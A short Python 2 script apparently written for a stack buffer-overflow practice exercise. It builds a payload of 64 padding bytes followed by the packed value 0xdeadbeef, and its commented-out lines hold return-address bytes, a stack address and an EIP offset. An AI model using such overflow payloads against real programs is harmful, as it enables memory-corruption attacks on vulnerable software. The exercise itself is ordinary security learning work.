"""
EIP = 80
buffer = 0xffffd04c
"""

import struct

nop_opcode = chr(0x90)
break_opcode = chr(0xcc)

padding = "A" * 64

deadbeef = struct.pack("I", 0xdeadbeef)

shellcode = padding + deadbeef

"""
shellcode += chr(0xf9)
shellcode += chr(0x84)
shellcode += chr(0x04)
shellcode += chr(0x08)

shellcode += chr(0xfc)
shellcode += chr(0xd0)
shellcode += chr(0xff)
shellcode += chr(0xff)
#shellcode += chr(0x4c) + chr(0xd0) + chr(0xff) + chr(0xff)
shellcode += "BBBB"
#shellcode += "E"
"""

print shellcode